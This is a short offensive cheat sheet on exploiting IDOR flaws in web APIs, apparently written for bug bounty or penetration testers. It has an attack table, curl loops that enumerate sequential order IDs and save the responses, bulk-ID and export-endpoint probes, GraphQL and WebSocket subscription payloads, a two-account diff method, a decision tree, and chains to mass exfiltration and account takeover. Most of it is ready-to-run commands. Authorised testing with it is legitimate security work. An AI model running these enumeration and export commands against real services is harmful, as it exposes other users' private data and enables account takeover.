# ADVANCED IDOR — EXECUTION

| Attack | Signal | Test | Confirm | Kill |
|--------|--------|------|---------|------|
| **Sequential ID** | id=N in URL | `for i in {1..100}; do curl /api/order/$i -b "session=A"; done` | Other user's data returned | All 403 → auth present |
| **UUID Access** | UUID in URL (still vulnerable!) | `curl /api/user/$UUID -b "session=B"` where UUID belongs to A | User A's data returned from B's session | 403 → access control |
| **Email as ID** | email in param | `curl /api/profile?email=victim@x.com -b "session=A"` | Victim profile returned | "cannot access other user" |
| **Batch/Export** | /all, /export, /batch | `curl /api/users/export -b "session=USER"` | All users exported | Paginated + filtered |
| **GraphQL IDOR** | GraphQL field with ID | `query { order(id: VICTIM_ID) { total status } }` | Other user's order returned | Field-level auth |
| **WebSocket IDOR** | subscription channel | `{"type":"subscribe","channel":"user.123.events"}` with other user's ID | Events from other user | Channel-scoped auth |
| **Bulk ID via Array** | ids[] or batch param | `curl /api/orders?ids[]=1&ids[]=5&ids[]=10` | Multiple orders regardless of owner | Server checks each ID |
| **IDOR via UUID** | UUID enumeration | Forge or discover UUID patterns via timing/diff | Other user accessible | Stateless UUID validated |

## CURL COMMANDS
```bash
# Setup: Create User A and User B, capture their cookies and resource IDs
# Basic IDOR test
curl -s "/api/orders/ORDER_B" -H "Cookie: SESSION_A" | jq '.'
# If shows ORDER_B's data → HORIZONTAL IDOR confirmed

# Sequential enumeration
for id in $(seq 1 100); do
  code=$(curl -s -o /tmp/order-$id.json -w "%{http_code}" \
    "/api/orders/$id" -H "Cookie: SESSION_A")
  [ "$code" = "200" ] && echo "Order $id: ACCESSIBLE" || true
done

# Bulk ID probe
curl -s "/api/orders?ids=1,2,3,4,5,6,7,8,9,10" -H "Cookie: A" | jq '. | length'

# Export/Batch endpoint
curl -s -X POST /api/admin/users/export -H "Cookie: USER_SESSION" \
  -d '{"format":"csv"}' | head -20

# UUID IDOR (just because it's UUID doesn't mean it's safe!)
# If you find a UUID in your profile, try it from another session
curl -s "https://target.com/api/user/$UUID" -H "Cookie: USER_B_SESSION" | head -c 200

# Email-based IDOR
curl -s "/api/user/find?email=victim@target.com" -H "Cookie: A"
```

## MULTI-ACCOUNT COMPARISON
```bash
# The most reliable IDOR detection method:
# 1. Get User A's resource
curl -s "/api/user/me/orders" -H "Cookie: A" > user_a_orders.json
# 2. Logout, use User B
curl -s "/api/user/me/orders" -H "Cookie: B" > user_b_orders.json
# 3. Diff: if A's order appears in B's response → IDOR
diff <(jq -c '.[].id' user_a_orders.json | sort) \
     <(jq -c '.[].id' user_b_orders.json | sort)
# If A's IDs visible in B's output → IDOR CONFIRMED
```

## DECISION TREE
```
Found resource accessed by ID?
├─ Is ID sequential/numeric?
│  ├─ Yes → ENUMERATE (for loop, find all accessible)
│  ├─ UUID → STILL TEST (UUID is not auth! Try from other session)
│  └─ Email/username → TEST FROM OTHER ACCOUNT
├─ Does User B see User A's data?
│  ├─ Yes → IDOR CONFIRMED
│  └─ No → access control present for single ID
├─ Can access batch/export endpoint?
│  ├─ Yes → MASS DATA EXPOSURE (try with low-priv session)
│  └─ No → scoped to user
└─ Can use GraphQL aliases to batch?
   ├─ Yes → GRAPHQL IDOR (query N IDs in one request)
   └─ No → single-query limit
```

## CHAIN
IDOR + No Rate Limit = Mass data exfiltration (P1)
IDOR + Privilege Escalation = Admin-level access to all resources
IDOR + Email Change = ATO via IDOR
IDOR + Password Reset = ATO via IDOR on password reset token
